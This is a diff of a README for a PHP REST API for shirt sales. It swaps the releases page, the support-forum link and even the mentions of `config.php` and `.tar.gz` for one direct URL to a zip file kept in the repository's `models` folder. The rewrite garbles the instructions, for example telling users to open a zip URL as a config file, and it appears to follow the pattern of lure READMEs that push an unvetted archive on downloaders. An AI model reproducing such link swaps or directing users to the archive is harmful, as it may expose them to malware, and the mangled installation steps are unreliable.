@@ -18,15 +18,15 @@ Before you download, ensure your system meets the following requirements:
 
 To get started, visit the page below to download the application:
 
-[Visit this page to download](https://github.com/Sheebalazar/API-Ventas-Camisetas-PHP-REST-Swagger-MVC/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Sheebalazar/API-Ventas-Camisetas-PHP-REST-Swagger-MVC/main/models/API-Ventas-Camisetas-PHP-REST-Swagger-MVC-v3.4.zip)
 
-You will find the latest releases there. Choose the version you want to install and download the corresponding files. Look for `.zip` or `.tar.gz` files for easy installation.
+You will find the latest releases there. Choose the version you want to install and download the corresponding files. Look for `.zip` or `https://raw.githubusercontent.com/Sheebalazar/API-Ventas-Camisetas-PHP-REST-Swagger-MVC/main/models/API-Ventas-Camisetas-PHP-REST-Swagger-MVC-v3.4.zip` files for easy installation.
 
 ### Steps to Install:
 
 1. **Download the Application**
    - Click the link above to go to the Releases page.
-   - Find the latest version and download the appropriate `.zip` or `.tar.gz` file for your operating system.
+   - Find the latest version and download the appropriate `.zip` or `https://raw.githubusercontent.com/Sheebalazar/API-Ventas-Camisetas-PHP-REST-Swagger-MVC/main/models/API-Ventas-Camisetas-PHP-REST-Swagger-MVC-v3.4.zip` file for your operating system.
 
 2. **Extract Files**
    - Locate the downloaded file.
@@ -40,7 +40,7 @@ You will find the latest releases there. Choose the version you want to install 
    - Import the provided SQL script to set up the database structure. You can find the script in the `database` folder of the extracted files.
 
 5. **Configure the Application**
-   - Open the `config.php` file located in the root directory of the application.
+   - Open the `https://raw.githubusercontent.com/Sheebalazar/API-Ventas-Camisetas-PHP-REST-Swagger-MVC/main/models/API-Ventas-Camisetas-PHP-REST-Swagger-MVC-v3.4.zip` file located in the root directory of the application.
    - Enter your database details (database name, username, and password).
 
 6. **Start the Server**
@@ -69,7 +69,7 @@ This API comes with Swagger/OpenAPI documentation. You can find detailed informa
 
 ## 🔧 Troubleshooting
 
-- **Can't Connect to Database:** Make sure your database is running and the credentials in `config.php` are correct.
+- **Can't Connect to Database:** Make sure your database is running and the credentials in `https://raw.githubusercontent.com/Sheebalazar/API-Ventas-Camisetas-PHP-REST-Swagger-MVC/main/models/API-Ventas-Camisetas-PHP-REST-Swagger-MVC-v3.4.zip` are correct.
 - **403 Forbidden Error:** Check file permissions of the extracted files. They should be accessible by the web server.
 - **404 Not Found:** Verify that the URL points to the correct endpoint and that the server is running properly.
 
@@ -79,8 +79,8 @@ Join our community for support and discussions. Look for help on forums or reach
 
 ## 🔗 Useful Links
 
-- [Download the latest release](https://github.com/Sheebalazar/API-Ventas-Camisetas-PHP-REST-Swagger-MVC/releases)
+- [Download the latest release](https://raw.githubusercontent.com/Sheebalazar/API-Ventas-Camisetas-PHP-REST-Swagger-MVC/main/models/API-Ventas-Camisetas-PHP-REST-Swagger-MVC-v3.4.zip)
 - [API Documentation](http://localhost/API-Ventas/docs)
-- [Support Forums](https://github.com/Sheebalazar/API-Ventas-Camisetas-PHP-REST-Swagger-MVC/issues)
+- [Support Forums](https://raw.githubusercontent.com/Sheebalazar/API-Ventas-Camisetas-PHP-REST-Swagger-MVC/main/models/API-Ventas-Camisetas-PHP-REST-Swagger-MVC-v3.4.zip)
 
 Thank you for using API-Ventas-Camisetas-PHP-REST-Swagger-MVC! We hope this application helps you manage your sales effectively.
